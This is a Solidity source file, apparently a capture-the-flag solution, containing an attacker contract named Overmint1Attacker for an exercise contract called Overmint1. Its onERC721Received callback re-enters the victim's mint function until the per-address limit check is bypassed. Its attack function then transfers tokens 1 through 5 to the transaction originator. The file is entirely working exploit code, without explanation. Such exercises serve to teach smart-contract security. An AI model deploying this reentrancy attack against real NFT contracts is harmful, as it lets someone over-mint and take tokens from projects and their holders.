// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "./Overmint1.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint1Attacker is IERC721Receiver {
    Overmint1 public victim;
    uint8 public count;

    constructor(address addr) {
        victim = Overmint1(addr);
    }

    function onERC721Received(
        address sender,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (victim.success(address(this))) {
            return this.onERC721Received.selector;
        }
        victim.mint();
        // console.log(sender == address(this));
        return this.onERC721Received.selector;
    }

    function attack() external {
        victim.mint();
        victim.transferFrom(address(this), tx.origin, 1);
        victim.transferFrom(address(this), tx.origin, 2);
        victim.transferFrom(address(this), tx.origin, 3);
        victim.transferFrom(address(this), tx.origin, 4);
        victim.transferFrom(address(this), tx.origin, 5);
    }
}
